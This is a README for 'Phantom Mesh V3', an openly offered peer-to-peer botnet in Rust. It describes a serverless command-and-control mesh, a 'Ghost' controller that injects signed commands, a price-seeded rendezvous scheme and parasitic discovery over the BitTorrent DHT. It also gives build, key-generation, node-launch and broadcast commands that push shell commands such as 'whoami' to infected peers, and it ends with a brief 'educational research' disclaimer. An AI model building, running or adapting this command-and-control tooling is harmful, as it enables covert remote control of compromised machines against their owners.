# Phantom Mesh V3: Autonomous P2P Botnet Architecture

**STATUS**: ACTIVE DEVELOPMENT (V3.3)
**ARCHITECTURE**: Pure P2P (Libp2p + WebRTC + GossipSub)
**VISIBILITY**: Stealth (Encrypted Signaling, Parasitic Discovery)

## 1. System Overview

Phantom Mesh V3 is a research-grade decentralized network architecture utilizing **Libp2p** and **WebRTC** to create a serverless, unstopppable Command & Control (C2) mesh.

Unlike traditional Client-Server botnets (or V1/V2 architectures), V3 has **NO Central Server**. All nodes are equal peers. Control is achieved via a "Ghost Controller" that injects cryptographically signed commands into the mesh.

### The Component Architecture

1.  **Phantom Mesh (The Node)**:
    *   **Role**: The core bot/peer.
    *   **Network**: Libp2p Swarm (WebRTC/TCP/QUIC).
    *   **Function**:
        *   Participates in **GossipSub** to propagate commands.
        *   Uses **Parasitic Discovery** (BitTorrent DHT) to find other peers without bootstrap servers.
        *   Executes commands verified by the Admin Public Key.

2.  **Phantom Ghost (The Controller)**:
    *   **Role**: P2P Light Client (Injector).
    *   **Function**:
        *   Acts as a "Ghost" node: Connects, Injects Command, Disconnects.
        *   **Multi-Point Injection**: Connects to 5+ random nodes via DHT to ensure propagation.
        *   **Security**: Holds the `admin.key` (Private Key) to sign commands.

## 2. Core Technologies

### Networking: WebRTC & GossipSub
*   **Transport**: WebRTC (Browser-compatible, NAT Traversal friendly) and TCP/Noise.
*   **Topology**: Unstructured Mesh (Gossip).
*   **Protocol**: Libp2p Identify, Ping, GossipSub v1.1.

### Security: Ed25519 Signatures
*   **Authentication**: Commands are valid ONLY if signed by the `admin.key`.
*   **Anti-Hijack**:
    *   Nodes have the Admin Public Key **hardcoded**.
    *   Even if a hacker joins the P2P network (or poisons the DHT), they cannot issue valid commands.

### Discovery: Financial-DGA & Parasitic DHT
*   **Financial-DGA**: Generates a daily "Rendezvous Topic" based on Yesterday's BTC/ETH Close Price (from Binance).
    *   *Note: This is predictable by design to allow decentralized consensus without communication.*
*   **Parasitic Discovery**: Leeching off the public BitTorrent Mainline DHT to store/retrieve peer IP addresses.

## 3. Usage & Operations

### Prerequisites
*   Rust 1.70+
*   `cmake`, `build-essential`

### Build All
```bash
cargo build --release --workspace
```

### Key Management (CRITICAL)
Before running anything, generate your Admin Key:
```bash
# Generates keys/ghost.key (Private) and prints Public Key
cargo run -p phantom -- keygen
```
*Note: The Public Key must be hardcoded into `flooding.rs` for nodes to accept your commands.*

### Running a Mesh Node
```bash
# Auto-discovery via DHT (Default)
./target/release/phantom_mesh
```

### Controlling the Mesh (Ghost)
The Controller acts as a P2P node. It needs to find entry points just like any other node.

**1. List Peers (Discovery Scan)**
```bash
./target/release/phantom list
# Scan DHT, find peers, print active IPs.
```

**2. Broadcast Command (Shell)**
```bash
# Injects signed command to updated random peers
./target/release/phantom broadcast --cmd "ping"
./target/release/phantom broadcast --cmd "whoami"
```

**3. Manual Bootstrap (Optional)**
If DHT is blocked/slow, force connection to a known IP:
```bash
./target/release/phantom broadcast --cmd "ping" --bootstrap "/ip4/1.2.3.4/tcp/9000"
```

## 4. Technical Stack
*   **Language**: Rust
*   **P2P Stack**: `libp2p` (Swarm, GossipSub, Kademlia, MDNS, Noise, Yamux)
*   **Crypto**: `ed25519-dalek`, `chacha20poly1305`
*   **Discovery**: `reqwest` (DGA), `libp2p-kad`

---
**DISCLAIMER**: This software is for educational research into resilient network architectures only. The Financial-DGA algorithm utilizes public historical data for consensus, which provides **rendezvous** capabilities but NOT **stealth** against traffic analysis.
